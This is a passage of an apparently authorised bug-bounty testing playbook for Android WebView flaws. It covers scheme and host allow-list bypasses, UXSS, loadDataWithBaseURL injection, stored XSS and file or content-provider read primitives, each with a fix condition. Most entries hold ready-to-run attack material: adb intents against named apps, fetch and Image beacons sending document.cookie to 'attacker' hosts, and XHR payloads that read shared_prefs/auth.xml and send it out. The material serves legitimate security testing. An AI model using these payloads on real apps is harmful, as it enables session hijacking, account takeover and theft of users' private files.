- **Test:** A weak validator uses `contains`/`endsWith`/`startsWith`, is scheme-blind, or disagrees between the
  parsed field and `toString()`. A strong one uses OkHttp `HttpUrl.parse().host()`/`topPrivateDomain()` with exact
  set-membership — verify on-device rather than assuming.
- **How:** Drive the deep link that feeds the WebView with each variant:
  ```
  https://example.com                          # control: loads
  https://example.com.attacker.tld/            # suffix confusion
  https://attacker.tld/?x=example.com          # substring in query
  https://attacker.tld#example.com             # substring in fragment
  https://example.com@attacker.tld/            # userinfo — real host is attacker.tld
  https://attacker.com\@legitimate.com         # backslash authority, API ≤ 24
  javascript://legitimate.com/%0aalert(1)      # scheme confusion, host=legitimate.com
  file://legitimate.com/sdcard/x.html          # scheme confusion
  data:text/html,<script>alert(1)</script>     # null host
  ```
  Plus the `android.net.Uri$HierarchicalUri` reflection variant whose `getHost()` lies vs `toString()`.
- **Proof:** The attacker origin renders (screenshot `document.domain`) — or, for a clean negative, the validator
  logs `Unauthorised Url opened` for every candidate on-device.
- **Escalation:** Any bypass reaching a token-returning bridge → D10-004 → D13.
- **Ruled out when:** on-device, every variant above is rejected because the validator does `scheme=="https"` AND
  exact `getHost()` set-membership after re-parsing `Uri.parse(uri.toString())` (or `java.net.URI`, which throws on
  backslash authority), and `minSdk ≥ 25`.

### D10-017 · Scheme never validated → `javascript:` / `file:` / `content:` / `data:` accepted

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all; `loadUrl("javascript:")` from an Intent is blocked on modern targetSdk — verify |
| **Maps to** | H1 #499348 (Twitter Lite, Critical), #2555949 (US DoD), #3475626 (LinkedIn 8.1), #1737358 (Shopify) |

- **Test:** Host allow-lists that check the host but never the scheme. Independent of any host bypass — a
  `javascript:`/`file:`/`content:`/`data:` URL whose "host" component matches the allow-list still passes.
- **How:**
  ```bash
  grep -rn 'getHost()' jadx_out/sources -B3 -A6 | grep -v 'getScheme()'   # host checked, scheme not
  ```
  ```bash
  adb shell am start -n com.target/.WebActivity --es URL "javascript:(function(){location='https://attacker/?c='+document.cookie})()"
  adb shell am start -n com.twitter.android.lite/.TwitterLiteActivity -d "javascript://example.com%0A alert(document.domain);"
  adb shell am start -n com.target/.WebActivity -d "file:///sdcard/BugBounty/1.html"
  ```
- **Proof:** `alert(document.domain)` showing the trusted origin, then the same payload replaced with an exfil
  `fetch()`/`new Image().src`; server log with the token and `; wv` UA.
- **Escalation:** → D10-004 bridge, D10-031 file read; LinkedIn #3475626 reached the vulnerable fragment via a
  `javascript://` scheme bypass, closing the JS after `#` (`javascript://host/%0aalert('1#')`) to survive an
  appended parameter.
- **Ruled out when:** the validator enforces `scheme in {https}` (or an explicit allow-list) before the host check,
  on-device, for every entry point including intent extras and `onNewIntent`.

### D10-018 · JavaScript enabled before the allow-list completes (order-of-checks bug)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) as the precondition for bridge abuse |
| **Attacker** | AM-02 |
| **Applies to** | all (JS is off by default; the bug is *when* it is turned on) |
| **Maps to** | HackTricks webview-attacks.md ("order-of-checks bug", Samsung S24 Pwn2Own 2024 chain) |

- **Test:** A pipeline of parse → partial-validate → **configure WebView (JS on)** → final-verify → `loadUrl` leaves
  JavaScript enabled on the instance even when the late check would have rejected the URL — and inconsistent
  normalisation between the early and late parsers widens the gap.
- **How:** In the handler, find `getSettings().setJavaScriptEnabled(true)` **before** the last host/path allow-list
  check, and multiple helpers that parse/split/rebuild the URL differently. Craft a link that passes the early
  checks and reaches the configuration site.
- **Proof:** Your JavaScript executes in the app's WebView even though the final allow-list would not have permitted
  the host (hook `setJavaScriptEnabled`/`loadUrl` with Frida to show ordering).
- **Escalation:** Immediately enumerate bridges from the executing page (D10-003/D10-004).
- **Ruled out when:** JS is enabled only after the final allow-list check passes, and the same normalisation is used
  for both the early and final checks.

### D10-019 · `getReferrer()` / scheme-only check used as authorisation for a bridged WebView

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via the reached bridge |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | all |
| **Maps to** | HackTricks webview-attacks.md ("scheme-only checks and `getReferrer()` are not auth"); `Activity.getReferrer()`, `Intent.EXTRA_REFERRER` |

- **Test:** An exported `VIEW`/`BROWSABLE` activity that forwards `url=` into `loadUrl()` while the bridge stays
  attached is not protected by validating only the scheme (attacker still controls host+path); and `getReferrer()`
  returns `Intent.EXTRA_REFERRER` when present, which a caller can spoof.
- **How:**
  ```bash
  grep -rn 'getReferrer()\|EXTRA_REFERRER' jadx_out/sources
  ```
  Browser trigger: `<a href="intent://webdialog?url=https%3A%2F%2Ftrusted%2Frewards#Intent;scheme=app;package=com.victim;end">`;
  or spoof the referrer from a PoC app by setting `Intent.EXTRA_REFERRER` to a trusted package/URI.
- **Proof:** The privileged bridged WebView loads your host after a scheme-only check, or after a forged referrer.
- **Escalation:** → D10-004.
- **Ruled out when:** authorisation validates scheme + exact host (not referrer), re-checks after redirects, and
  detaches the bridge when leaving trusted origins.

### D10-020 · `shouldOverrideUrlLoading` / `shouldInterceptRequest` allow-list blind spots

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) once it reaches a bridge/file access |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0398, MASTG-TEST-0400, MASWE-0035; `WebViewClient.java` "not called for" lists |

- **Test:** An allow-list enforced only in these callbacks has documented holes. `shouldOverrideUrlLoading` is **not**
  called for POST requests, XHRs, iframes, `src` attributes, `<script>` tags, or navigations the app itself started
  with `loadUrl()`. `shouldInterceptRequest` is **not** called for `javascript:`, `blob:`, `android_asset` or
  `android_res`, is **not** called for redirect URLs (only the initial URL), and runs on a non-UI thread.
- **How:**
  ```bash
  grep -rn -A25 'shouldOverrideUrlLoading\|shouldInterceptRequest' jadx_out/sources
  ```
  Test page inside the WebView:
  ```html
  <form id=f method=POST action="https://attacker.tld/"><input name=x value=1></form><script>f.submit()</script>
  <iframe src="data:text/html,<script>parent.postMessage('x','*')</script>"></iframe>
  ```
- **Proof:** Your server receives the POST although the allow-list should block the host; or the `data:`/`blob:`/iframe
  content executes. Log both sides; a Frida trace showing the attacker URL returning `false` from
  `shouldOverrideUrlLoading` also proves it.
- **Escalation:** Reinstates the D10 chain — an iframe reaches content the handler never sees (D10-006).
- **Ruled out when:** navigation trust is enforced by an origin allow-list applied to *loads* (not only in these
  callbacks), non-`http(s)` schemes are hard-blocked, and the bridge is scoped to the calling frame's origin.

### D10-021 · WebView vs Custom Tab trust-classifier confusion

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all apps that mix both surfaces (most consumer apps) |
| **Maps to** | `developer.chrome.com/docs/android/custom-tabs`; `risks/unsafe-uri-loading` |

- **Test:** Apps route "our domains" to a bridged WebView (with the session cookie) and "external" links to a Chrome
  Custom Tab. The bug is in the *classifier*: a URL it treats as internal but that is attacker-controllable (open
  redirect on the trusted host, a user-content subdomain, a `?next=` param) lands in the bridged WebView instead of
  the sandboxed Custom Tab.
- **How:**
  ```bash
  grep -rnE 'CustomTabsIntent|launchUrl|isInternalUrl|isTrustedHost|endsWith\("\.example\.com"\)|contains\("example.com"\)' jadx_out/sources
  ```
  Attack the classifier: `https://example.com.attacker.tld`, `https://attacker.tld/?x=example.com`,
  `https://example.com@attacker.tld`, `https://EXAMPLE.COM.attacker.tld`, and any open redirect on the real host.
- **Proof:** The crafted URL rendering inside the in-app WebView (identifiable by the app's toolbar and the JS bridge
  object) rather than in a Custom Tab.
- **Escalation:** Deep link × WebView allow-list × OAuth redirect → D10-004/D28.
- **Ruled out when:** the classifier does exact-host matching against a fixed first-party list, treats redirects as
  external, and no open redirect exists on the trusted host to smuggle back in.

### D10-022 · `loadDataWithBaseURL` with an attacker-influenced `baseUrl` (Universal XSS / same-origin session theft)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) if delivered stored |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | `WebView.java` (`loadDataWithBaseURL`); H1 #532836/#1455987 (Exness), Oversecured Evernote UXSS; local corpus Class #17 |

- **Test:** `loadDataWithBaseURL(baseUrl, html, ...)` runs `html` in the origin of `baseUrl`. Control both and you have
  XSS on any origin the app has cookies for. A null/invalid base gives a `null` origin (never trust it); a *trusted*
  base rendering attacker HTML grants that HTML the app's real web origin including its cookies and localStorage.
- **How:**
  ```bash
  grep -rn 'loadDataWithBaseURL(' jadx_out/sources -B20 | grep -n 'getStringExtra\|getArguments\|getQueryParameter'
  ```
  The SurveyMonkey SDK shape (Exness) — two extras straight into the sink:
  ```java
  i.setClassName("com.exness.android.pa","com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity");
  i.putExtra("smSPageURL","https://my.exness.com");
  i.putExtra("smSPageHTML","<script>fetch('https://attacker/?c='+document.cookie)</script>");
  startActivity(i);
  ```
- **Proof:** `document.cookie`/`localStorage.getItem('token')` for the *target's* origin arriving at your server —
  and because all WebView cookies share one store, this reaches cookies for every site the app has visited (payment
  providers included), which is exactly how #532836 was argued.
- **Escalation:** → D13 session theft; symlink the cookie DB for the raw store (D10-038); token → D15.
- **Ruled out when:** `loadDataWithBaseURL` is never called with a trusted base + untrusted data, or the base is
  always `null`/`about:blank` AND the data is fully first-party and HTML-escaped.

### D10-023 · WebView XSS from an Intent extra rendered with `loadData()` / `loadDataWithBaseURL(null,...)`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) if cross-user; else the bridge/file-access path |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | exported/proxy-reachable activities rendering Intent-derived HTML |
| **Maps to** | HackTricks webview-attacks.md ("WebView XSS via Intent extras → loadData()"); KuCoin `kucoin:///link?data=`; CVE-2015-7893 (Samsung SecEmailUI) |

- **Test:** Reading an attacker-controlled extra and injecting it into a WebView via `loadData()`/`loadDataWithBaseURL(null,...)`
  with JS enabled is reflected XSS inside the app. Even with a null origin it reaches the bridge and (with the right
  settings) `file://`/`content://`.
- **How:**
  ```bash
  grep -rn 'loadData(\|loadDataWithBaseURL(' jadx_out/sources
  adb shell am start -n com.victim/.ExportedWebViewActivity --es data '<img src=x onerror="alert(document.domain)">'
  adb shell am start -a android.intent.action.VIEW -d "kucoin:///link?data=%3Cscript%3Ealert(1)%3C/script%3E"
  ```
- **Proof:** The injected script executes (screenshot with app chrome), then a beacon carrying `document.cookie` or
  a bridge return to your server.
- **Escalation:** A permissive base URL widens the origin (D10-022); bridge (D10-004); `file://`/`content://` pivots.
- **Ruled out when:** the extra is HTML-escaped/JSON-encoded before rendering, JS is disabled on that WebView, and no
  bridge/file access is attached; use marker discipline — confirm your 8+ char marker is not already in the baseline.

### D10-024 · `onNewIntent` context-reuse UXSS (`javascript:` into a reused WebView)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | `singleTop`/`singleTask` activities reusing a WebView across intents |
| **Maps to** | Oversecured WebView checklist §7; local corpus Class #17 |

- **Test:** `onNewIntent(i){ webView.loadUrl(i.getDataString()); }` on a reused WebView lets an attacker first load a
  legitimate origin, then deliver `javascript:` into the *same* WebView — executing script in the earlier trusted
  origin.
- **How:**
  ```bash
  grep -rn 'onNewIntent' jadx_out/sources -A10 | grep -n 'loadUrl\|getDataString'
  ```
  ```bash
  adb shell am start -n com.victim/.WebActivity -d 'https://legit.example/'
  sleep 2
  adb shell am start -n com.victim/.WebActivity -d 'javascript:document.write(document.domain)'
  ```
- **Proof:** The page renders `legit.example` as `document.domain` (screenshot), proving script ran in an origin the
  attacker does not own; swap `document.write` for an exfil of that origin's cookies/storage.
- **Escalation:** UXSS in a session origin → token exfil → ATO; can call any bridge gated on that origin.
- **Ruled out when:** `onNewIntent` re-validates the data through the allow-list (scheme + host), or a fresh WebView
  is created per navigation, and `javascript:` is rejected.

### D10-025 · Native→JS string-concatenation injection (`evaluateJavascript` / `loadUrl("javascript:")`)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) when the concatenated value is server-stored and cross-user; else the bridge path |
| **Attacker** | AM-02 / AM-05 |
| **Applies to** | all; only exploitable if the interpolated value is attacker-controlled |
| **Maps to** | Oversecured WebView checklist §8/§9 ("use JSON methods to sanitize"); local corpus Class #18 (the "Valmo F1 class") |

- **Test:** Untrusted input concatenated into `evaluateJavascript("f('"+x+"')")` or `loadUrl("javascript:f('"+x+"')")`
  lets an attacker break the quote and inject JS. Exploitable **only if `x` is attacker-controlled** via IPC/deep link/a
  server-stored field — trace the source. If `x` is app/server-internal (Moshi JSON, a CDN URL), it is a nit, not a bug.
- **How:**
  ```bash
  grep -rn 'evaluateJavascript(' jadx_out/sources | grep '+' ; grep -rn 'loadUrl("javascript:' jadx_out/sources | grep '+'
  # then trace each interpolated variable back to getQueryParameter/getStringExtra/a provider row/a profile field
  ```
  ```
  myapp://launch?page=test'); fetch('https://attacker/?c='+document.cookie); ('
  ```
  Hooking `evaluateJavascript` at runtime is especially high-yield — it shows the exact injected object graph
  (config, tokens, API base URLs).
- **Proof:** `alert(document.cookie)` or an exfil beacon executes in the WebView's trusted origin, delivered from the
  traced attacker source; server log with the value.
- **Escalation:** JS foothold in the trusted origin → bridge calls (D10-004) → token theft. Stored value → every
  user who views it → mass ATO (D10-027).
- **Ruled out when:** the value is `JSONObject.quote()`/org.json-encoded before injection, OR the data-flow trace
  shows `x` is entirely app/server-internal with no attacker-writable source.

### D10-026 · HTML injection into a string-concatenated WebView template

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) |
| **Attacker** | AM-02 / AM-05 |
| **Applies to** | apps that build HTML by concatenation then `loadData`/`loadDataWithBaseURL` |
| **Maps to** | H1 #283063 (IRCCloud, Medium), #176065 (Brave, High), #297547 (Simplenote) |

- **Test:** Apps that build HTML by concatenation and render it. Any field reaching the template — image URL, title,
  author, filename — is an injection point (IRCCloud injected via an `img src='...'` attribute).
- **How:** IRCCloud #283063 shape:
  ```java
  mImage.loadDataWithBaseURL(null,"<img src='"+new URL(urlStr)+"' onerror='Android.imageFailed()' onclick='Android.imageClicked()'/>","text/html","UTF-8",null);
  ```
  ```java
  intent.setClassName("com.irccloud.android","com.irccloud.android.activity.ImageViewerActivity");
  intent.setData(Uri.parse("https://x.jpg' onload='window.location.href=\"http://attacker\""));
  ```
  Brave #176065 (server-side title): `<script>location="...q=</title><h1><marquee><s>Injection<!--"</script>`.
- **Proof:** Your injected element rendering, then navigation/exfil to your host.
- **Escalation:** The rating tracks whether a JS bridge is present in the same WebView (IRCCloud's template referenced
  an `Android.` bridge) → D10-004.
- **Ruled out when:** every interpolated field is attribute/HTML-escaped before concatenation, or the template renders
  in a WebView with JS disabled and no bridge.

### D10-027 · Stored XSS in server content rendered by a WebView (cross-user)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2); Critical when it reaches a bridge |
| **Attacker** | AM-05 (another user of the same app) |
| **Applies to** | all WebViews rendering backend-supplied content with JS enabled |
| **Maps to** | H1 #176065, #283063, #189793, #87835, #121275, #41856, #297547, #230119; `risks/cross-app-scripting` |

- **Test:** Content the backend returns (article body, chat message, profile field, image title, filename) rendered
  into a WebView with JS enabled executes in the app's WebView origin. In a WebView there is no browser sandbox — XSS
  is the entry point to the bridge and file primitives, and it fires for *other* users.
- **How:** Inject into every field the app displays in a WebView. **Marker discipline:** use an 8+ char random
  marker, and grep the baseline response for it first — a WebView echoing a value it was already rendering is not
  injection. Then for impact:
  ```html
  "><img src=x onerror="fetch('https://attacker/?c='+document.cookie)">
  */alert(1)</script><script>/*    <!-- filename-rendered variant -->
  ```
  Also test the trusted-origin CRM/banner path: an attacker-writable profile field (often authorised by a *public*
  identifier) → first-party page fetches banner JSON → SDK renders it with `innerHTML` (JSON escaping is not HTML
  escaping) → stored XSS on the trusted origin → bridge call.
- **Proof:** The payload executing for a *different* account (screenshot + server hit with `; wv` UA). A `stored.self`
  variant that only fires for the injecting user is P5 — do not file it.
- **Escalation:** → D10-004 bridge token theft → mass ATO (D13/D15).
- **Ruled out when:** the backend HTML-escapes the field on output for the WebView context, or the content renders in
  a JS-disabled WebView, and the marker never appears live for another user.

### D10-028 · Second-order WebView XSS through `ContentProvider` metadata

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) |
| **Attacker** | AM-03 (malicious local app supplying a `content://` URI) |
| **Applies to** | hybrid apps and any WebView that interpolates untrusted metadata into HTML |
| **Maps to** | HackTricks webview-attacks.md ("Second-order WebView XSS through `ContentProvider` metadata"; Acode v1.10.5 Cordova zero-day) |

- **Test:** Do not limit source-tracing to Intent extras or file bytes. An app may query an attacker-owned `content://`
  URI, keep `OpenableColumns.DISPLAY_NAME`, and render that stored name later — in a dialog, error path or resume
  handler — via `innerHTML`.
- **How:** Audit `metadata source → persistent state → lifecycle/error path → HTML sink`:
  ```bash
  grep -RniE 'innerHTML|outerHTML|insertAdjacentHTML' assets/www src
  grep -RniE 'DISPLAY_NAME|filename|displayName|getLastPathSegment' assets/www src
  ```
  Build a stateful malicious provider: `query()` returns `DISPLAY_NAME = <img src=x onerror='PAYLOAD'>`; `openFile()`
  serves bytes from `ParcelFileDescriptor.createPipe()`; a `gone` flag later makes it throw. Deliver via
  `ACTION_EDIT`/`FLAG_GRANT_READ_URI_PERMISSION`, then trigger the error/resume path.
- **Proof:** The payload executes in the existing hybrid document (confirm the `onResume`/Cordova `resume` handler ran
  and the editor state was reused). To keep the privileged document alive, replace the DOM
  (`document.documentElement.innerHTML = ...` + recreate `<script>` nodes) rather than navigating.
- **Escalation:** Enumerate `window.cordova`/plugin methods from the injected code — WebView XSS does not
  automatically give native execution; you must reach a bridge.
- **Ruled out when:** provider-supplied display names are HTML-escaped before any `innerHTML` sink, or the app never
  renders `content://` metadata into HTML.

### D10-029 · UXSS via `setSupportMultipleWindows()` default — CVE-2020-6506

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on the reached origin |
| **Attacker** | AM-02 (one tap/keypress required) |
| **Applies to** | LEGACY — WebView engine < 83.0.4103.106; still live on non-updatable OEM/kiosk images |
| **Maps to** | H1 #906433 (Twitter, High 8.1, CVE-2020-6506, crbug 1083819) |

- **Test:** With multi-window support off (the default), a cross-origin iframe can call `window.open()` with a
  `javascript:` URL and execute in the **top-level** document.
- **How:**
  ```bash
  grep -rn 'setSupportMultipleWindows\|onCreateWindow' jadx_out/sources    # absence == vulnerable default
  adb shell dumpsys package com.google.android.webview | grep versionName  # need < 83.0.4103.106
  ```
  Inside a cross-origin iframe on a page the app loads: `<script>window.open("javascript:alert(document.domain)")</script>`.
  Requires one tap/keypress in the top document (the iframe can be invisible and harvest it).
- **Proof:** `alert(document.domain)` reporting the **top-level** origin from inside the iframe, then exfiltrating
  page contents; plus the WebView version string.
- **Escalation:** Anything sensitive rendered in that WebView is exfiltratable → D13.
- **Ruled out when:** the test-device WebView is ≥ 83.0.4103.106 (patched 2020-06-15) and WebView is updatable — the
  vendor-side mitigation is `setSupportMultipleWindows(true)` + an `onCreateWindow` handler.

### D10-030 · `onCreateWindow` / `window.open` child window inheriting the bridge

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the child inherits a token bridge |
| **Attacker** | AM-02 |
| **Applies to** | apps with `setSupportMultipleWindows(true)` + an `onCreateWindow` handler |
| **Maps to** | `WebChromeClient.java` (`onCreateWindow` — "no trustworthy way to tell which page requested the new window"); `WebSettings.java` defaults |

- **Test:** When multi-window is supported, `onCreateWindow` cannot reliably tell which frame requested the window
  ("the request might originate from a third-party iframe"), and apps should not allow windows when `isUserGesture`
  is false. A child WebView that inherits the JS bridge or the session is reachable from an attacker iframe.
- **How:**
  ```bash
  grep -rn 'onCreateWindow\|setSupportMultipleWindows\|setJavaScriptCanOpenWindowsAutomatically' jadx_out/sources -A15
  ```
- **Proof:** A `window.open()` from an attacker iframe produces a new in-app WebView; enumerate `window.<bridge>` in
  the child window and screenshot the non-null return.
- **Escalation:** → D10-004 in the child context.
- **Ruled out when:** `onCreateWindow` refuses non-user-gesture opens, the child WebView gets no bridge and no session,
  or multi-window is disabled.

### D10-031 · `setAllowUniversalAccessFromFileURLs` / `setAllowFileAccessFromFileURLs` → XHR file exfiltration

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | defaults key on `targetSdk` — see below; on a modern target the setter must be explicit |
| **Maps to** | MASTG-TEST-0252/-0253, MASWE-0034; `risks/webview-unsafe-file-inclusion`; H1 #499348, #288955 |

- **Test:** With either enabled and any attacker-influenced content reachable, a `file://` page can XHR the app's
  private files and POST them out. The most reliable "arbitrary file read → ATO" primitive in the corpus.
- **How:**
  ```bash
  grep -rnE 'setAllowUniversalAccessFromFileURLs|setAllowFileAccessFromFileURLs|setAllowFileAccess|setJavaScriptEnabled' jadx_out/sources
  # confirm the EFFECTIVE value with the D10-001 Java.choose reader — do NOT infer from defaults
  ```
  Drop a payload the app will open, then:
  ```html
  <script>
  var x=new XMLHttpRequest();
  x.open('GET','file:///data/data/com.target/shared_prefs/auth.xml');
  x.onload=function(){ new Image().src='https://attacker.tld/?d='+btoa(x.responseText); };
  x.send();
  </script>
  ```
  ```bash
  adb push exploit.html /sdcard/exploit.html
  adb shell am start -n com.target/.WebViewActivity -es URL "file:///sdcard/exploit.html"
  ```
- **Proof:** Your server receives the base64 of `auth.xml` (decode the token in the report), plus the settings dump
  showing `universal=true`. Note **sending is always allowed** — these settings gate only *reading*; the blocked
  negative control logs `Access to XMLHttpRequest ... from origin 'null' has been blocked by CORS policy`.
- **Escalation:** → D11/D13 → D15 ATO.
- **Ruled out when:** the live read shows both from-file-URL settings `false` (their default from targetSdk 16) and no
  `file://` load path exists — then the CORS block above fires and the read fails. Never write "insecure by default"
  on a modern target for these two.

### D10-032 · `setAllowFileAccess` + a `file://` load path (get the defaults right)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | `setAllowFileAccess` defaults **true for targetSdk ≤ 29**, false from 30 (LEGACY default-true below 30) |
| **Maps to** | MASTG-KNOW-0018 defaults table; `risks/webview-unsafe-file-inclusion`; H1 #499348 |

- **Test:** `setAllowFileAccess(true)` (or unset on targetSdk < 30) plus JS on plus a `file://` load path lets the page
  read the sandbox via XHR/symlink even without universal access — combine with D10-031 or D10-038.
- **How:**
  ```bash
  grep -rnE 'setAllowFileAccess|loadUrl\("file://|loadDataWithBaseURL' jadx_out/sources
  aapt2 dump badging app.apk | grep -E 'targetSdkVersion'
  ```
- **Proof:** A `file://` page reading `/data/data/<pkg>/...`. `file:///android_asset` and `file:///android_res` are
  always accessible regardless of these settings; `setAllowFileAccessFromFileURLs` is *ignored* when
  `allowUniversalAccessFromFileURLs=true`.
- **Escalation:** → D10-031 exfil, D10-038 cookie-DB symlink.
- **Ruled out when:** `setAllowFileAccess(false)` is set (or targetSdk ≥ 30 with no explicit `true`) and no `file://`
  URL can be loaded via any entry point.

### D10-033 · `setAllowContentAccess` → WebView reads `content://` providers (including non-exported)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) floor → P1 for a private token store |
| **Attacker** | AM-02 |
| **Applies to** | all — `setAllowContentAccess` defaults **true at every API level** |
| **Maps to** | MASTG-TEST-0250/-0251, MASWE-0034; MASTG-KNOW-0018 ("declared by the app, even if not exported") |

- **Test:** With content access on (the default), JS in the WebView can `XMLHttpRequest` any `content://` URI the app
  can read — including the app's own **non-exported** providers. Combined with `allowUniversalAccessFromFileURLs`, a
  `file://` page can *read* those responses (without it the `XHR` sends but the body is unreadable).
- **How:**
  ```bash
  grep -rn 'setAllowContentAccess' jadx_out/sources     # absence = the insecure default applies
  # from JS in the WebView (XHR, not fetch — fetch cannot read content://):
  #   var x=new XMLHttpRequest(); x.open('GET','content://<authority>/sensitive.txt'); ...
  ```
- **Proof:** Provider bytes arriving at your server; the blocked negative control logs the CORS message for
  `content://`. MASTG's caveat: `AllowContentAccess` alone is not a vulnerability — demonstrate the JS-injection
  vector that reaches it.
- **Escalation:** Non-exported provider → private DB → D07/D13.
- **Ruled out when:** `setAllowContentAccess(false)` is set, OR no JS-injection vector reaches the WebView and no
  `file://`-origin page can read the response (universal access off).

### D10-034 · `shouldInterceptRequest` path traversal + wildcard CORS → universal local-file read

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | apps implementing custom `shouldInterceptRequest` resource loading |
| **Maps to** | Oversecured "vulnerabilities in WebResourceResponse" (Amazon `LocalAssetHandler`); H1 #1011956 (CWE-749, $2300); local corpus Class #23 |

- **Test:** A custom `shouldInterceptRequest` that serves a local file from a user-influenced path — `getLastPathSegment()`
  is **decoded**, so `..%2F` → `../` — and returns `Access-Control-Allow-Origin: *` on the `WebResourceResponse`
  turns the asset loader into a universal cross-origin local-file-read primitive. (ACAO:* helps but is not required —
  the attacker can match scheme/host/port.)
- **How:**
  ```bash
  grep -rn 'shouldInterceptRequest' jadx_out/sources -A25 | grep -nE 'getLastPathSegment|getPath|new File|FileInputStream|getAssets\(\).open'
  grep -rn 'new WebResourceResponse(' jadx_out/sources -B8 | grep -i 'Access-Control-Allow-Origin'
  ```
  From any JS foothold:
  ```javascript
  var x=new XMLHttpRequest();
  x.open('GET','https://app.local/local_cache/..%2Fshared_prefs%2Fauth.xml');
  x.onload=function(){ location='https://attacker/?d='+encodeURIComponent(x.responseText); };
  x.send();
  ```
- **Proof:** `responseText` contains the victim's `auth.xml` and reaches your server — the traversal plus the served
  origin (or ACAO:*) is what makes the cross-origin read succeed.
- **Escalation:** Chain from D10-017/D10-023 for the JS foothold; token → D13.
- **Ruled out when:** the handler uses `androidx.webkit.WebViewAssetLoader`, or canonicalises and prefix-checks the
  path before `new File`, does not return ACAO:*, and the file-access settings are locked down.

### D10-035 · `WebViewAssetLoader` not used where local content is served

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | inherits the file-inclusion severity (D10-034/D10-031) |
| **Attacker** | AM-02 |
| **Applies to** | all apps serving local assets to a WebView |
| **Maps to** | `risks/webview-unsafe-file-inclusion` (canonical `WebViewAssetLoader` snippet); `AssetsPathHandler`/`ResourcesPathHandler`/`InternalStoragePathHandler` |

- **Test:** The recommended replacement serves assets over `https://appassets.androidplatform.net/assets/...` with the
  four file/content settings off. An app still on `file:///android_asset/` has a weaker origin model; and an
  `InternalStoragePathHandler` scoped too broadly exposes internal storage over the asset-loader origin.
- **How:**
  ```bash
  grep -rn 'WebViewAssetLoader\|AssetsPathHandler\|ResourcesPathHandler\|InternalStoragePathHandler\|appassets.androidplatform.net' jadx_out/sources
  grep -rn 'file:///android_asset\|file:///android_res' jadx_out/sources
  ```
- **Proof:** `loadUrl("file:///android_asset/...")` plus any file-access setting enabled — then the D10-031 exfil PoC;
  or an over-scoped `InternalStoragePathHandler` root serving a private file.
- **Escalation:** → D10-031/D10-034.
- **Ruled out when:** all local content is served via `WebViewAssetLoader` with narrowly-scoped handlers and the four
  file/content settings off.

### D10-036 · WebView loading content from external storage

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via the bridge/file access the injected page reaches |
| **Attacker** | AM-03 / AM-04 |
| **Applies to** | all; the external-storage write precondition is easier below API 29 (pre-scoped-storage) |
| **Maps to** | MobSF `android_webview_external` (CWE-919, masvs platform-6) |

- **Test:** `webView.loadUrl("file://" + getExternalStorageDirectory() + ...)` renders content any app (pre-scoped
  storage) or any app with the right access could have rewritten — attacker HTML executing with the WebView's settings
  and bridges.
- **How:**
  ```bash
  grep -rn 'loadUrl(' jadx_out/sources -B3 | grep -n 'getExternalStorageDirectory\|getExternalFilesDir\|/sdcard'
  ```
- **Proof:** Overwrite the target HTML from another app (or `adb push`) and show your script executing with bridge
  access.
- **Escalation:** → D10-004 bridge abuse.
- **Ruled out when:** the WebView never loads from external/shared storage, or the loaded file lives in app-private
  storage no other app can write.

### D10-037 · `onShowFileChooser` implicit-intent interception (malicious picker returns a `file://` URI)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
